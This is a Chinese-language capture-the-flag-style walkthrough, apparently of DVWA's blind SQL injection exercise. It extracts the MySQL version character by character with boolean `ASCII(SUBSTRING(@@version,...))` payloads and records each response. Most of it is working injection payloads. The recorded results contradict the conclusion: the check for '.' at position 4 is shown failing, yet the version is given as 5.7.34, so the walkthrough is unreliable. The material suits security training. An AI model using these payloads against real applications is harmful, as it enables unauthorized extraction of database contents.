# SQL Injection (Blind)

> Objective:
Find the version of the SQL database software through a blind SQL attack.

這次是 POST，但如果直接照搬之前使用的語法會無法正常判斷

```sql
1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53)
# User ID exists in the database.
```

### Boolean-based blind injection

參考之前在 medium 的語法

```sql
1 AND (SELECT version() <> 0);

# User ID exists in the database.
```

```sql
1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53)
```

如果我們故意寫錯這個判斷，它應該要回傳 false (`User ID is MISSING in the database.`)，結果卻是 true

```sql
1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 52)
# User ID exists in the database.
```

因此需要修改，為了避免它可能被截斷或者被結尾部份的語法影響到，試著在前後加上 `'` 和 `#`

判斷版本的第 1 個字元是否為 5

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53)#

# User ID exists in the database. 
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b9ecbe88-d06f-44b0-9b09-811f71e6824d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T110641Z&X-Amz-Expires=86400&X-Amz-Signature=7cd726f046540698600729a212c8cc117962ea049d9f2d1c0fc1fda312b8313d&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

反過來驗證一下，這次應該要回傳 false

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 52)#

# User ID is MISSING from the database.
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/ee2ab94c-c323-493a-a175-a147c9162c9c/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T110703Z&X-Amz-Expires=86400&X-Amz-Signature=4f8a58ca29f6087f2bb7496779ebe0c546885260b69c37190843d26f2a548453&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
看起來這樣就對了，接著繼續往下測試，模擬猜出版號的過程

判斷版本的第 2 個字元是否為 .

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),2,1)) = 46)#

# User ID exists in the database.
```

判斷版本的第 3 個字元是否為 7

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),3,1)) = 55)#

# User ID exists in the database.
```

判斷版本的第 4 個字元是否為 4

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),4,1)) = 52)#

# User ID is MISSING from the database.
```

判斷版本的第 4 個字元是否為 .

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),4,1)) = 46)#

# User ID is MISSING from the database.
```

判斷版本的第 5 個字元是否為 3

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),5,1)) = 51)#

# User ID exists in the database.
```

判斷版本的第 6 個字元是否為 4

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 52)#

# User ID exists in the database.
```

判斷版本的第 7 個字元是否為 .

```sql
1' AND (SELECT ascii(SUBSTRING((SELECT @@version),7,1)) = 46)#

# User ID is MISSING from the database.
```

### Done

因此可以推斷版本為

```sql
5.7.34
```

當然實際上還是要參考 release 上的版號清單去猜
